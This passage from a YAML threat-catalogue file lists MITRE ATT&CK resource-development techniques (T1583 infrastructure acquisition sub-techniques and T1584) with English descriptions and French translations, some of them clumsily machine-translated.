          \ y compris \xE0 partir de services proxy r\xE9sidentiels. (Citation : amnesty_nso_pegasus)(Citation\
          \ : Bourrage de cr\xE9dentiels de mandataires du FBI)(Citation : Mandiant\
          \ APT29 Microsoft 365 2022) Selon la mise en \u0153uvre, les adversaires\
          \ peuvent utiliser des infrastructures qui rendent difficile la connexion\
          \ physique \xE0 eux, ainsi que des infrastructures pouvant \xEAtre rapidement\
          \ provisionn\xE9es, modifi\xE9es et arr\xEAt\xE9es.\nhttps://attack.mitre.org/techniques/T1583"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1583.001
    ref_id: T1583.001
    name: Domains
    description: "Adversaries may acquire domains that can be used during targeting.\
      \ Domain names are the human readable names used to represent one or more IP\
      \ addresses. They can be purchased or, in some cases, acquired for free.\n\n\
      Adversaries may use acquired domains for a variety of purposes, including for\
      \ [Phishing](https://attack.mitre.org/techniques/T1566), [Drive-by Compromise](https://attack.mitre.org/techniques/T1189),\
      \ and Command and Control.(Citation: CISA MSS Sep 2020) Adversaries may choose\
      \ domains that are similar to legitimate domains, including through use of homoglyphs\
      \ or use of a different top-level domain (TLD).(Citation: FireEye APT28)(Citation:\
      \ PaypalScam) Typosquatting may be used to aid in delivery of payloads via [Drive-by\
      \ Compromise](https://attack.mitre.org/techniques/T1189). Adversaries may also\
      \ use internationalized domain names (IDNs) and different character sets (e.g.\
      \ Cyrillic, Greek, etc.) to execute \"IDN homograph attacks,\" creating visually\
      \ similar lookalike domains used to deliver malware to victim machines.(Citation:\
      \ CISA IDN ST05-016)(Citation: tt_httrack_fake_domains)(Citation: tt_obliqueRAT)(Citation:\
      \ httrack_unhcr)(Citation: lazgroup_idn_phishing)\n\nDifferent URIs/URLs may\
      \ also be dynamically generated to uniquely serve malicious content to victims\
      \ (including one-time, single use domain names).(Citation: iOS URL Scheme)(Citation:\
      \ URI)(Citation: URI Use)(Citation: URI Unique)\n\nAdversaries may also acquire\
      \ and repurpose expired domains, which may be potentially already allowlisted/trusted\
      \ by defenders based on an existing reputation/history.(Citation: Categorisation_not_boundary)(Citation:\
      \ Domain_Steal_CC)(Citation: Redirectors_Domain_Fronting)(Citation: bypass_webproxy_filtering)\n\
      \nDomain registrars each maintain a publicly viewable database that displays\
      \ contact information for every registered domain. Private WHOIS services display\
      \ alternative information, such as their own company data, rather than the owner\
      \ of the domain. Adversaries may use such private WHOIS services to obscure\
      \ information about who owns a purchased domain. Adversaries may further interrupt\
      \ efforts to track their infrastructure by using varied registration information\
      \ and purchasing domains with different domain registrars.(Citation: Mandiant\
      \ APT1)\n\nIn addition to legitimately purchasing a domain, an adversary may\
      \ register a new domain in a compromised environment. For example, in AWS environments,\
      \ adversaries may leverage the Route53 domain service to register a domain and\
      \ create hosted zones pointing to resources of the threat actor\u2019s choosing.(Citation:\
      \ Invictus IR DangerDev 2024)\nhttps://attack.mitre.org/techniques/T1583/001"
    translations:
      fr:
        name: Domaines
        description: "Les adversaires peuvent acqu\xE9rir des domaines qui peuvent\
          \ \xEAtre utilis\xE9s lors du ciblage. Les noms de domaine sont les noms\
          \ lisibles par l\u2019humain utilis\xE9s pour repr\xE9senter une ou plusieurs\
          \ adresses IP. Ils peuvent \xEAtre achet\xE9s ou, dans certains cas, obtenus\
          \ gratuitement.\n\nLes adversaires peuvent utiliser les domaines acquis\
          \ \xE0 diverses fins, notamment pour le [phishing](https://attack.mitre.org/techniques/T1566),\
          \ la [compromission en drive-by](https://attack.mitre.org/techniques/T1189)\
          \ et le commandement et contr\xF4le. (Citation : CISA MSS sept. 2020) Les\
          \ adversaires peuvent choisir des domaines similaires aux domaines l\xE9\
          gitimes, notamment par l\u2019utilisation d\u2019homoglyphes ou l\u2019\
          utilisation d\u2019un autre domaine de niveau sup\xE9rieur (TLD). (Citation\
          \ : FireEye APT28)(Citation : Arnaque Paypal) Le typosquatting peut \xEA\
          tre utilis\xE9 pour faciliter la livraison des charges utiles via [Compromission\
          \ en voiture](https://attack.mitre.org/techniques/T1189). Les adversaires\
          \ peuvent \xE9galement utiliser des noms de domaine internationalis\xE9\
          s (IDN) et diff\xE9rents ensembles de caract\xE8res (par exemple cyrillique,\
          \ grec, etc.) pour ex\xE9cuter des \xAB attaques homographiques IDN \xBB\
          , cr\xE9ant des domaines visuellement similaires utilis\xE9s pour transmettre\
          \ des logiciels malveillants aux machines victimes. (Citation : CISA IDN\
          \ ST05-016)(Citation : tt_httrack_fake_domains)(Citation : tt_obliqueRAT)(Citation\
          \ : httrack_unhcr)(Citation : lazgroup_idn_phishing)\n\nDiff\xE9rents URI/URLs\
          \ peuvent \xE9galement \xEAtre g\xE9n\xE9r\xE9s dynamiquement pour servir\
          \ de mani\xE8re unique le contenu malveillant aux victimes (y compris des\
          \ noms de domaine \xE0 usage unique et \xE0 usage unique). (Citation : syst\xE8\
          me d\u2019URL iOS)(Citation : URI)(Citation : Utilisation de l\u2019URI)(Citation\
          \ : URI Unique)\n\nLes adversaires peuvent \xE9galement acqu\xE9rir et r\xE9\
          utiliser des domaines expir\xE9s, qui peuvent \xEAtre potentiellement d\xE9\
          j\xE0 autoris\xE9s ou dignes de confiance par les d\xE9fenseurs en fonction\
          \ d\u2019une r\xE9putation ou d\u2019un historique existant. (Citation :\
          \ Categorisation_not_boundary)(Citation : Domain_Steal_CC)(Citation : Redirectors_Domain_Fronting)(Citation\
          \ : bypass_webproxy_filtering)\n\nChaque registraire de domaine maintient\
          \ une base de donn\xE9es publique qui affiche les coordonn\xE9es de chaque\
          \ domaine enregistr\xE9. Les services WHOIS priv\xE9s affichent des informations\
          \ alternatives, telles que leurs propres donn\xE9es d\u2019entreprise, plut\xF4\
          t que le propri\xE9taire du domaine. Les adversaires peuvent utiliser ces\
          \ services WHOIS priv\xE9s pour masquer des informations sur le propri\xE9\
          taire d\u2019un domaine achet\xE9. Les adversaires peuvent encore interrompre\
          \ les efforts de suivi de leur infrastructure en utilisant des informations\
          \ d\u2019enregistrement vari\xE9es et en achetant des domaines aupr\xE8\
          s de diff\xE9rents registraires de domaines. (Citation : Mandiant APT1)\n\
          \nEn plus d\u2019acheter l\xE9gitimement un domaine, un adversaire peut\
          \ enregistrer un nouveau domaine dans un environnement compromis. Par exemple,\
          \ dans les environnements AWS, les adversaires peuvent utiliser le service\
          \ de domaine Route53 pour enregistrer un domaine et cr\xE9er des zones h\xE9\
          berg\xE9es pointant vers des ressources choisies par l\u2019acteur malveillant.\
          \ (Citation : Invictus IR DangerDev 2024)\nhttps://attack.mitre.org/techniques/T1583/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1583.002
    ref_id: T1583.002
    name: DNS Server
    description: 'Adversaries may set up their own Domain Name System (DNS) servers
      that can be used during targeting. During post-compromise activity, adversaries
      may utilize DNS traffic for various tasks, including for Command and Control
      (ex: [Application Layer Protocol](https://attack.mitre.org/techniques/T1071)).
      Instead of hijacking existing DNS servers, adversaries may opt to configure
      and run their own DNS servers in support of operations.


      By running their own DNS servers, adversaries can have more control over how
      they administer server-side DNS C2 traffic ([DNS](https://attack.mitre.org/techniques/T1071/004)).
      With control over a DNS server, adversaries can configure DNS applications to
      provide conditional responses to malware and, generally, have more flexibility
      in the structure of the DNS-based C2 channel.(Citation: Unit42 DNS Mar 2019)

      https://attack.mitre.org/techniques/T1583/002'
    translations:
      fr:
        name: Serveur DNS
        description: "Les adversaires peuvent configurer leurs propres serveurs DNS\
          \ (Domain Name System) qui peuvent \xEAtre utilis\xE9s lors du ciblage.\
          \ Lors d\u2019une activit\xE9 post-compromis, les adversaires peuvent utiliser\
          \ le trafic DNS pour diverses t\xE2ches, notamment pour la Commande et le\
          \ Contr\xF4le (ex : [Application Layer Protocol](https://attack.mitre.org/techniques/T1071)).\
          \ Au lieu de d\xE9tourner les serveurs DNS existants, les adversaires peuvent\
          \ choisir de configurer et d\u2019ex\xE9cuter leurs propres serveurs DNS\
          \ pour soutenir les op\xE9rations.\n\nEn faisant fonctionner leurs propres\
          \ serveurs DNS, les adversaires peuvent avoir plus de contr\xF4le sur la\
          \ mani\xE8re dont ils administrent le trafic DNS C2 c\xF4t\xE9 serveur ([DNS](https://attack.mitre.org/techniques/T1071/004)).\
          \ Avec le contr\xF4le d\u2019un serveur DNS, les adversaires peuvent configurer\
          \ les applications DNS pour fournir des r\xE9ponses conditionnelles aux\
          \ logiciels malveillants et, en g\xE9n\xE9ral, avoir plus de flexibilit\xE9\
          \ dans la structure du canal C2 bas\xE9 sur DNS. (Citation : Unit42 DNS\
          \ mars 2019)\nhttps://attack.mitre.org/techniques/T1583/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1583.003
    ref_id: T1583.003
    name: Virtual Private Server
    description: "Adversaries may rent Virtual Private Servers (VPSs)\_that can be\
      \ used during targeting. There exist a variety of cloud service providers that\
      \ will sell virtual machines/containers as a service. By utilizing a VPS, adversaries\
      \ can make it difficult to physically tie back operations to them. The use of\
      \ cloud infrastructure can also make it easier for adversaries to rapidly provision,\
      \ modify, and shut down their infrastructure.\n\nAcquiring a VPS for use in\
      \ later stages of the adversary lifecycle, such as Command and Control, can\
      \ allow adversaries to benefit from the ubiquity and trust associated with higher\
      \ reputation cloud service providers. Adversaries may also acquire infrastructure\
      \ from VPS service providers that are known for renting VPSs with minimal registration\
      \ information, allowing for more anonymous acquisitions of infrastructure.(Citation:\
      \ TrendmicroHideoutsLease)\nhttps://attack.mitre.org/techniques/T1583/003"
    translations:
      fr:
        name: "Serveur priv\xE9 virtuel"
        description: "Les adversaires peuvent louer des serveurs priv\xE9s virtuels\
          \ (VPS) qui peuvent \xEAtre utilis\xE9s lors du ciblage. Il existe une vari\xE9\
          t\xE9 de fournisseurs de services cloud qui vendent des machines virtuelles/conteneurs\
          \ en tant que service. En utilisant un VPS, les adversaires peuvent rendre\
          \ difficile le lien physique des op\xE9rations avec eux. L\u2019utilisation\
          \ de l\u2019infrastructure cloud peut \xE9galement faciliter la fourniture\
          \ rapide, la modification et la fermeture rapide de leur infrastructure\
          \ par les adversaires.\n\nL\u2019acquisition d\u2019un VPS pour une utilisation\
          \ aux \xE9tapes avanc\xE9es du cycle de vie de l\u2019adversaire, comme\
          \ le Commandement et Contr\xF4le, peut permettre aux adversaires de b\xE9\
          n\xE9ficier de l\u2019ubiquit\xE9 et de la confiance associ\xE9es aux fournisseurs\
          \ de services cloud \xE0 meilleure r\xE9putation. Les adversaires peuvent\
          \ \xE9galement acqu\xE9rir des infrastructures aupr\xE8s de fournisseurs\
          \ de services VPS connus pour louer des VPS avec un minimum d\u2019informations\
          \ d\u2019enregistrement, permettant ainsi des acquisitions plus anonymes\
          \ d\u2019infrastructures. (Citation : TrendmicroHideoutsLease)\nhttps://attack.mitre.org/techniques/T1583/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1583.004
    ref_id: T1583.004
    name: Server
    description: "Adversaries may buy, lease, rent, or obtain physical servers\_that\
      \ can be used during targeting. Use of servers allows an adversary to stage,\
      \ launch, and execute an operation. During post-compromise activity, adversaries\
      \ may utilize servers for various tasks, such as watering hole operations in\
      \ [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), enabling\
      \ [Phishing](https://attack.mitre.org/techniques/T1566) operations, or facilitating\
      \ [Command and Control](https://attack.mitre.org/tactics/TA0011). Instead of\
      \ compromising a third-party [Server](https://attack.mitre.org/techniques/T1584/004)\
      \ or renting a [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003),\
      \ adversaries may opt to configure and run their own servers in support of operations.\
      \ Free trial periods of cloud servers may also be abused.(Citation: Free Trial\
      \ PurpleUrchin)(Citation: Freejacked) \n\nAdversaries may only need a lightweight\
      \ setup if most of their activities will take place using online infrastructure.\
      \ Or, they may need to build extensive infrastructure if they want to test,\
      \ communicate, and control other aspects of their activities on their own systems.(Citation:\
      \ NYTStuxnet)\nhttps://attack.mitre.org/techniques/T1583/004"
    translations:
      fr:
        name: Serveur
        description: "Les adversaires peuvent acheter, louer, louer ou obtenir des\
          \ serveurs physiques pouvant \xEAtre utilis\xE9s lors du ciblage. L\u2019\
          utilisation de serveurs permet \xE0 un adversaire de mettre en sc\xE8ne,\
          \ de lancer et d\u2019ex\xE9cuter une op\xE9ration. Lors d\u2019activit\xE9\
          s post-compromis, les adversaires peuvent utiliser des serveurs pour diverses\
          \ t\xE2ches, telles que la d\xE9tection d\u2019op\xE9rations de points d\u2019\
          eau dans [Compromission en voiture](https://attack.mitre.org/techniques/T1189),\
          \ l\u2019activation des op\xE9rations de [phishing](https://attack.mitre.org/techniques/T1566),\
          \ ou la facilitation de [Commandement et Contr\xF4le](https://attack.mitre.org/tactics/TA0011).\
          \ Au lieu de compromettre un serveur tiers (https://attack.mitre.org/techniques/T1584/004)\
          \ ou de louer un [Serveur Priv\xE9 Virtuel](https://attack.mitre.org/techniques/T1583/003),\
          \ les adversaires peuvent choisir de configurer et d\u2019ex\xE9cuter leurs\
          \ propres serveurs pour soutenir les op\xE9rations. Les p\xE9riodes d\u2019\
          essai gratuites des serveurs cloud peuvent \xE9galement \xEAtre abus\xE9\
          es. (Citation : Essai gratuit PurpleUrchin)(Citation : D\xE9tourn\xE9 libre)\
          \ \n\nLes adversaires n\u2019auront besoin d\u2019un \xE9quipement l\xE9\
          ger que si la plupart de leurs activit\xE9s se d\xE9roulent via une infrastructure\
          \ en ligne. Ou bien, ils peuvent devoir construire une infrastructure \xE9\
          tendue s\u2019ils veulent tester, communiquer et contr\xF4ler d\u2019autres\
          \ aspects de leurs activit\xE9s sur leurs propres syst\xE8mes. (Citation\
          \ : NYTStuxnet)\nhttps://attack.mitre.org/techniques/T1583/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1583.005
    ref_id: T1583.005
    name: Botnet
    description: "Adversaries may buy, lease, or rent a network of compromised systems\_\
      that can be used during targeting. A botnet is a network of compromised systems\
      \ that can be instructed to perform coordinated tasks.(Citation: Norton Botnet)\
      \ Adversaries may purchase a subscription to use an existing botnet from a booter/stresser\
      \ service. \n\nInternet-facing edge devices and related network appliances that\
      \ are end-of-life (EOL) and unsupported by their manufacturers are commonly\
      \ acquired for botnet activities. Adversaries may lease operational relay box\
      \ (ORB) networks \u2013 consisting of virtual private servers (VPS), small office/home\
      \ office (SOHO) routers, or Internet of Things (IoT) devices \u2013 to serve\
      \ as a botnet.(Citation: ORB Mandiant) \n\nWith a botnet at their disposal,\
      \ adversaries may perform follow-on activity such as large-scale [Phishing](https://attack.mitre.org/techniques/T1566)\
      \ or Distributed Denial of Service (DDoS).(Citation: Imperva DDoS for Hire)(Citation:\
      \ Krebs-Anna)(Citation: Krebs-Bazaar)(Citation: Krebs-Booter) Acquired botnets\
      \ may also be used to support Command and Control activity, such as [Hide Infrastructure](https://attack.mitre.org/techniques/T1665)\
      \ through an established [Proxy](https://attack.mitre.org/techniques/T1090)\
      \ network.\nhttps://attack.mitre.org/techniques/T1583/005"
    translations:
      fr:
        name: Botnet
        description: "Les adversaires peuvent acheter, louer ou louer un r\xE9seau\
          \ de syst\xE8mes compromis qui peuvent \xEAtre utilis\xE9s lors du ciblage.\
          \ Un botnet est un r\xE9seau de syst\xE8mes compromis qui peuvent \xEAtre\
          \ instruits pour effectuer des t\xE2ches coordonn\xE9es. (Citation : Norton\
          \ Botnet) Les adversaires peuvent acheter un abonnement pour utiliser un\
          \ botnet existant via un service booter/stresser. \n\nLes dispositifs de\
          \ p\xE9riph\xE9rie connect\xE9s \xE0 Internet et les appliances r\xE9seau\
          \ associ\xE9es, en fin de vie (EOL) et non pris en charge par leurs fabricants,\
          \ sont couramment acquis pour des activit\xE9s de botnet. Les adversaires\
          \ peuvent louer des r\xE9seaux de bo\xEEtes relais op\xE9rationnelles (ORB)\
          \ \u2013 compos\xE9s de serveurs priv\xE9s virtuels (VPS), de petits routeurs\
          \ de bureau/home office (SOHO) ou d\u2019appareils Internet des objets (IoT)\
          \ \u2013 pour servir de botnet. (Citation : ORB Mandiant) \n\nAvec un botnet\
          \ \xE0 leur disposition, les adversaires peuvent effectuer des activit\xE9\
          s de suivi telles que le [phishing](https://attack.mitre.org/techniques/T1566)\
          \ ou le d\xE9ni de service distribu\xE9 (DDoS). (Citation : Imperva DDoS\
          \ \xE0 louer)(Citation : Krebs-Anna)(Citation : Krebs-Bazaar)(Citation :\
          \ Krebs-Booter) Les botnets acquis peuvent \xE9galement \xEAtre utilis\xE9\
          s pour soutenir l\u2019activit\xE9 de Commandement et Contr\xF4le, comme\
          \ [Masquer l\u2019infrastructure](https://attack.mitre.org/techniques/T1665)\
          \ via un r\xE9seau [Proxy](https://attack.mitre.org/techniques/T1090) \xE9\
          tabli.\nhttps://attack.mitre.org/techniques/T1583/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1583.006
    ref_id: T1583.006
    name: Web Services
    description: "Adversaries may register for web services\_that can be used during\
      \ targeting. A variety of popular websites exist for adversaries to register\
      \ for a web-based service that can be abused during later stages of the adversary\
      \ lifecycle, such as during Command and Control ([Web Service](https://attack.mitre.org/techniques/T1102)),\
      \ [Exfiltration Over Web Service](https://attack.mitre.org/techniques/T1567),\
      \ or [Phishing](https://attack.mitre.org/techniques/T1566). Using common services,\
      \ such as those offered by Google, GitHub, or Twitter, makes it easier for adversaries\
      \ to hide in expected noise.(Citation: FireEye APT29)(Citation: Hacker News\
      \ GitHub Abuse 2024) By utilizing a web service, adversaries can make it difficult\
      \ to physically tie back operations to them.\nhttps://attack.mitre.org/techniques/T1583/006"
    translations:
      fr:
        name: Web Services
        description: "Les adversaires peuvent s\u2019enregistrer pour des services\
          \ web qui peuvent \xEAtre utilis\xE9s lors du ciblage. Une vari\xE9t\xE9\
          \ de sites web populaires existent pour que les adversaires s\u2019enregistrent\
          \ \xE0 un service web qui peut \xEAtre abus\xE9 lors des \xE9tapes ult\xE9\
          rieures du cycle de vie de l\u2019adversaire, comme lors de Command and\
          \ Control ([Web Service](https://attack.mitre.org/techniques/T1102)), [Exfiltration\
          \ Over Web Service](https://attack.mitre.org/techniques/T1567) ou [Phishing](https://attack.mitre.org/techniques/T1566).\
          \ L\u2019utilisation de services courants, tels que ceux propos\xE9s par\
          \ Google, GitHub ou Twitter, facilite la dissimulation des adversaires dans\
          \ le bruit attendu. (Citation : FireEye APT29)(Citation : Hacker News GitHub\
          \ Abuse 2024) En utilisant un service web, les adversaires peuvent rendre\
          \ difficile le lien physique des op\xE9rations avec eux.\nhttps://attack.mitre.org/techniques/T1583/006"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1583.007
    ref_id: T1583.007
    name: Serverless
    description: 'Adversaries may purchase and configure serverless cloud infrastructure,
      such as Cloudflare Workers, AWS Lambda functions, or Google Apps Scripts, that
      can be used during targeting. By utilizing serverless infrastructure, adversaries
      can make it more difficult to attribute infrastructure used during operations
      back to them.


      Once acquired, the serverless runtime environment can be leveraged to either
      respond directly to infected machines or to [Proxy](https://attack.mitre.org/techniques/T1090)
      traffic to an adversary-owned command and control server.(Citation: BlackWater
      Malware Cloudflare Workers)(Citation: AWS Lambda Redirector)(Citation: GWS Apps
      Script Abuse 2021) As traffic generated by these functions will appear to come
      from subdomains of common cloud providers, it may be difficult to distinguish
      from ordinary traffic to these providers - making it easier to [Hide Infrastructure](https://attack.mitre.org/techniques/T1665).(Citation:
      Detecting Command & Control in the Cloud)(Citation: BlackWater Malware Cloudflare
      Workers)

      https://attack.mitre.org/techniques/T1583/007'
    translations:
      fr:
        name: Serverless
        description: "Les adversaires peuvent acheter et configurer des infrastructures\
          \ cloud serverless, telles que Cloudflare Workers, AWS Lambda functions\
          \ ou Google Apps Scripts, qui peuvent \xEAtre utilis\xE9es lors du ciblage.\
          \ En utilisant une infrastructure serverless, les adversaires peuvent rendre\
          \ plus difficile l\u2019attribution des infrastructures utilis\xE9es pendant\
          \ les op\xE9rations.\n\nUne fois acquis, l\u2019environnement d\u2019ex\xE9\
          cution serverless peut \xEAtre exploit\xE9 pour r\xE9pondre directement\
          \ aux machines infect\xE9es ou au trafic [proxy](https://attack.mitre.org/techniques/T1090)\
          \ vers un serveur de commande et de contr\xF4le appartenant \xE0 l\u2019\
          adversaire. (Citation : Travailleurs de Cloudflare du malware Blackwater)(Citation\
          \ : Redirecteur AWS Lambda)(Citation : Abus de script des applications GWS\
          \ 2021) Comme le trafic g\xE9n\xE9r\xE9 par ces fonctions semblera provenir\
          \ de sous-domaines de fournisseurs cloud courants, il peut \xEAtre difficile\
          \ de distinguer le trafic ordinaire vers ces fournisseurs \u2013 ce qui\
          \ facilite la mise en place de [Masquer l\u2019infrastructure](https://attack.mitre.org/techniques/T1665).\
          \ (Citation : D\xE9tection du commandement et du contr\xF4le dans le cloud)(Citation\
          \ : Travailleurs de Cloudflare du malware Blackwater)\nhttps://attack.mitre.org/techniques/T1583/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1583.008
    ref_id: T1583.008
    name: Malvertising
    description: "Adversaries may purchase online advertisements that can be abused\
      \ to distribute malware to victims. Ads can be purchased to plant as well as\
      \ favorably position artifacts in specific locations  online, such as prominently\
      \ placed within search engine results. These ads may make it more difficult\
      \ for users to distinguish between actual search results and advertisements.(Citation:\
      \ spamhaus-malvertising) Purchased ads may also target specific audiences using\
      \ the advertising network\u2019s capabilities, potentially further taking advantage\
      \ of the trust inherently given to search engines and popular websites. \n\n\
      Adversaries may purchase ads and other resources to help distribute artifacts\
      \ containing malicious code to victims. Purchased ads may attempt to impersonate\
      \ or spoof well-known brands. For example, these spoofed ads may trick victims\
      \ into clicking the ad which could then send them to a malicious domain that\
      \ may be a clone of official websites containing trojanized versions of the\
      \ advertised software.(Citation: Masquerads-Guardio)(Citation: FBI-search) Adversary\u2019\
      s efforts to create malicious domains and purchase advertisements may also be\
      \ automated at scale to better resist cleanup efforts.(Citation: sentinelone-malvertising)\
      \ \n\nMalvertising may be used to support [Drive-by Target](https://attack.mitre.org/techniques/T1608/004)\
      \ and [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), potentially\
      \ requiring limited interaction from the user if the ad contains code/exploits\
      \ that infect the target system's web browser.(Citation: BBC-malvertising)\n\
      \nAdversaries may also employ several techniques to evade detection by the advertising\
      \ network. For example, adversaries may dynamically route ad clicks to send\
      \ automated crawler/policy enforcer traffic to benign sites while validating\
      \ potential targets then sending victims referred from real ad clicks to malicious\
      \ pages. This infection vector may therefore remain hidden from the ad network\
      \ as well as any visitor not reaching the malicious sites with a valid identifier\
      \ from clicking on the advertisement.(Citation: Masquerads-Guardio) Other tricks,\
      \ such as intentional typos to avoid brand reputation monitoring, may also be\
      \ used to evade automated detection.(Citation: spamhaus-malvertising)\nhttps://attack.mitre.org/techniques/T1583/008"
    translations:
      fr:
        name: Malvertising
        description: "Les adversaires peuvent acheter des publicit\xE9s en ligne qui\
          \ peuvent \xEAtre abus\xE9es pour distribuer des malwares aux victimes.\
          \ Les publicit\xE9s peuvent \xEAtre achet\xE9es pour planter et positionner\
          \ favorablement des artefacts dans des endroits sp\xE9cifiques en ligne,\
          \ comme les mises en avant dans les r\xE9sultats des moteurs de recherche.\
          \ Ces publicit\xE9s peuvent rendre plus difficile pour les utilisateurs\
          \ de distinguer les r\xE9sultats de recherche r\xE9els des publicit\xE9\
          s. (Citation : spamhaus-malvertising) Les publicit\xE9s achet\xE9es peuvent\
          \ \xE9galement cibler des audiences sp\xE9cifiques gr\xE2ce aux capacit\xE9\
          s du r\xE9seau publicitaire, tirant ainsi davantage parti de la confiance\
          \ qui est inn\xE9e aux moteurs de recherche et aux sites web populaires.\
          \ \n\nLes adversaires peuvent acheter des publicit\xE9s et d\u2019autres\
          \ ressources pour aider \xE0 distribuer des artefacts contenant du code\
          \ malveillant aux victimes. Les publicit\xE9s achet\xE9es peuvent tenter\
          \ d\u2019usurper l\u2019identit\xE9 ou de parodier des marques connues.\
          \ Par exemple, ces publicit\xE9s usurp\xE9es peuvent tromper les victimes\
          \ en les poussant \xE0 cliquer sur l\u2019annonce, ce qui pourrait les envoyer\
          \ vers un domaine malveillant qui pourrait \xEAtre un clone de sites officiels\
          \ contenant des versions trojanis\xE9es du logiciel annonc\xE9. (Citation\
          \ : Masquerads-Guardio)(Citation : FBI-search) Les efforts de l\u2019adversaire\
          \ pour cr\xE9er des domaines malveillants et acheter des publicit\xE9s peuvent\
          \ \xE9galement \xEAtre automatis\xE9s \xE0 grande \xE9chelle afin de mieux\
          \ r\xE9sister aux efforts de nettoyage. (Citation : sentinelone-malvertising)\
          \ \n\nLe malvertising peut \xEAtre utilis\xE9 pour supporter [Drive-by Target](https://attack.mitre.org/techniques/T1608/004)\
          \ et [Drive-by-Compromise](https://attack.mitre.org/techniques/T1189), n\xE9\
          cessitant potentiellement une interaction limit\xE9e de la part de l\u2019\
          utilisateur si la publicit\xE9 contient du code/des exploits infectant le\
          \ navigateur web du syst\xE8me cible. (Citation : BBC-malvertising)\n\n\
          Les adversaires peuvent \xE9galement employer plusieurs techniques pour\
          \ \xE9chapper \xE0 la d\xE9tection par le r\xE9seau publicitaire. Par exemple,\
          \ les adversaires peuvent acheminer dynamiquement les clics publicitaires\
          \ pour envoyer du trafic automatis\xE9 de robots d\u2019indexation/application\
          \ de politiques vers des sites innocents tout en validant des cibles potentielles,\
          \ puis en envoyant les victimes r\xE9f\xE9renc\xE9es \xE0 partir de clics\
          \ publicitaires r\xE9els vers des pages malveillantes. Ce vecteur d\u2019\
          infection peut donc rester cach\xE9 au r\xE9seau publicitaire ainsi qu\u2019\
          \xE0 tout visiteur qui n\u2019atteint pas les sites malveillants avec un\
          \ identifiant valide en cliquant sur la publicit\xE9. (Citation : Masquerads-Guardio)\
          \ D\u2019autres astuces, comme des fautes de frappe intentionnelles pour\
          \ \xE9viter la surveillance de la r\xE9putation de la marque, peuvent \xE9\
          galement \xEAtre utilis\xE9es pour \xE9viter la d\xE9tection automatis\xE9\
          e. (Citation : spamhaus-malvertising)\nhttps://attack.mitre.org/techniques/T1583/008"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1584
    ref_id: T1584
    name: Compromise Infrastructure
    description: 'Adversaries may compromise third-party infrastructure that can be
      used during targeting. Infrastructure solutions include physical or cloud servers,
      domains, network devices, and third-party web and DNS services. Instead of buying,
      leasing, or renting infrastructure an adversary may compromise infrastructure
      and use it during other phases of the adversary lifecycle.(Citation: Mandiant
      APT1)(Citation: ICANNDomainNameHijacking)(Citation: Talos DNSpionage Nov 2018)(Citation:
      FireEye EPS Awakens Part 2) Additionally, adversaries may compromise numerous
      machines to form a botnet they can leverage.


      Use of compromised infrastructure allows adversaries to stage, launch, and execute
      operations. Compromised infrastructure can help adversary operations blend in
      with traffic that is seen as normal, such as contact with high reputation or
      trusted sites. For example, adversaries may leverage compromised infrastructure
      (potentially also in conjunction with [Digital Certificates](https://attack.mitre.org/techniques/T1588/004))
      to further blend in and support staged information gathering and/or [Phishing](https://attack.mitre.org/techniques/T1566)
      campaigns.(Citation: FireEye DNS Hijack 2019) Adversaries may also compromise
      numerous machines to support [Proxy](https://attack.mitre.org/techniques/T1090)
      and/or proxyware services or to form a botnet.(Citation: amnesty_nso_pegasus)(Citation:
      Sysdig Proxyjacking) Additionally, adversaries may compromise infrastructure
      residing in close proximity to a target in order to gain [Initial Access](https://attack.mitre.org/tactics/TA0001)
      via [Wi-Fi Networks](https://attack.mitre.org/techniques/T1669).(Citation: Nearest
      Neighbor Volexity)


      By using compromised infrastructure, adversaries may enable follow-on malicious
      operations. Prior to targeting, adversaries may also compromise the infrastructure
      of other adversaries.(Citation: NSA NCSC Turla OilRig)

      https://attack.mitre.org/techniques/T1584'
    translations:
      fr:
        name: Infrastructure de compromis
        description: "Les adversaires peuvent compromettre l\u2019infrastructure tierce\
          \ pouvant \xEAtre utilis\xE9e lors du ciblage. Les solutions d\u2019infrastructure\
          \ incluent les serveurs physiques ou cloud, les domaines, les dispositifs\
          \ r\xE9seau et les services web et DNS tiers. Au lieu d\u2019acheter, louer\
          \ ou louer des infrastructures, un adversaire peut compromettre les infrastructures\
          \ et les utiliser lors d\u2019autres phases du cycle de vie adverse. (Citation\
          \ : Mandiant APT1)(Citation : ICANNDomainNameHijacking)(Citation : Talos\
          \ DNSpionage nov. 2018)(Citation : FireEye EPS Awakens Partie 2) De plus,\
          \ les adversaires peuvent compromettre de nombreuses machines pour former\
          \ un botnet qu\u2019ils peuvent exploiter.\n\nL\u2019utilisation d\u2019\
          infrastructures compromises permet aux adversaires de mettre en place, de\
          \ lancer et d\u2019ex\xE9cuter des op\xE9rations. Une infrastructure compromise\
          \ peut aider les op\xE9rations adverses \xE0 s\u2019int\xE9grer au trafic\
          \ per\xE7u comme normal, comme les contacts avec des sites \xE0 forte r\xE9\
          putation ou de confiance. Par exemple, les adversaires peuvent exploiter\
          \ une infrastructure compromise (potentiellement \xE9galement en lien avec\
          \ les [certificats num\xE9riques](https://attack.mitre.org/techniques/T1588/004))\
          \ pour mieux s\u2019int\xE9grer et soutenir la collecte d\u2019informations\
          \ en \xE9tapes et/ou les campagnes de [phishing](https://attack.mitre.org/techniques/T1566).\
          \ (Citation : D\xE9tournement DNS FireEye 2019) Les adversaires peuvent\
          \ \xE9galement compromettre de nombreuses machines pour supporter des services\
          \ [proxy](https://attack.mitre.org/techniques/T1090) et/ou proxoxyware,\
          \ ou pour former un botnet. (Citation : amnesty_nso_pegasus)(Citation :\
          \ D\xE9tournement de proxys Sysdig) De plus, les adversaires peuvent compromettre\
          \ l\u2019infrastructure situ\xE9e \xE0 proximit\xE9 imm\xE9diate d\u2019\
          une cible afin d\u2019obtenir un [Acc\xE8s Initial](https://attack.mitre.org/tactics/TA0001)\
          \ via les [r\xE9seaux Wi-Fi](https://attack.mitre.org/techniques/T1669).\
